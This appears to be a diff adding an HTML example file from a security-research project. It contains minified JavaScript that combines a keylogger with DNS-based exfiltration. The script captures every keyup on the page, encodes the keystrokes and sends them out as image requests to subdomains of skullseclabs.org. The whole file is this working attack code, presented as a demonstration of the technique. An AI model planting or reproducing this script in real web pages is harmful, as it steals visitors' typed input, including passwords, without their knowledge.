@@ -1,0 +1,16 @@
+<!-- 
+  index.inline.html
+  By Stefan Penner
+  Created December, 2009
+
+  (See LICENSE.txt)
+
+  This file is provided as an example, showing an inline and minified example of the jsdnscat + keylogger script working together.
+  An example of the jsdnscat library being used to transmit logged key strokes
+  
+ -->
+<script type='text/javascript'>
+  var SkullSecurity=SkullSecurity||{};
+  (function(a){function d(b){var e,f="",g;for(g=0;g<b.length;g++){e=b.charCodeAt(g);f+=String.fromCharCode((e>>4)+97);f+=String.fromCharCode((e&15)+97)}return f}var c=Math.floor(Math.random()*Math.pow(2,32));a.jsdnscat=a.jsdnscat||{};a.jsdnscat.send=function(b){b+="";var e=0,f=31,g=Math.floor((b.length+1)/32+1),h="";(function(){h=b.slice(e,f);url="";if(h){url="http://dnscat.0."+g+"."+d(h)+"."+c++ +".skullseclabs.org";(new Image).src=url;e+=31;f+=31;setTimeout(arguments.callee,100)}})()}})(SkullSecurity);SkullSecurity=SkullSecurity||{};(function(a){a.attachEvent=function(d,c,b){if(d.addEventListener)d.addEventListener(c,b,false);else d.attachEvent&&d.attachEvent("on"+c,b)}})(SkullSecurity);(function(a){a.keylogger=a.keylogger||{};a.keylogger.start=function(d){a.attachEvent(document,"keyup",function(c){if(!c)c=window.event;d.call(c,c.keyCode)})}})(SkullSecurity);
+  SkullSecurity.keylogger.start(SkullSecurity.jsdnscat.send);
+</script>
